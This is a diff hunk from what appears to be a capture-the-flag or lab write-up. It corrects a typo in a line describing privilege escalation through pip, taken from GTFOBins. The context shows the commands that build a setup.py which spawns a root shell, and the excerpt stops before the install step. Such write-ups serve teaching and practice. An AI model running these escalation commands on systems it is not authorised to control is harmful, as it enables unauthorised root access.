@@ -193,7 +193,7 @@ chmod 600 rsa
   </div>
 <br>
 
-* at this poing i used GTFobins to see how to switch to root user with pip and i used to following 
+* at this point i used GTFobins to see how to switch to root user with pip and i used to following 
   ```bash
   TF=$(mktemp -d)
   echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')">$TF/setup.py 
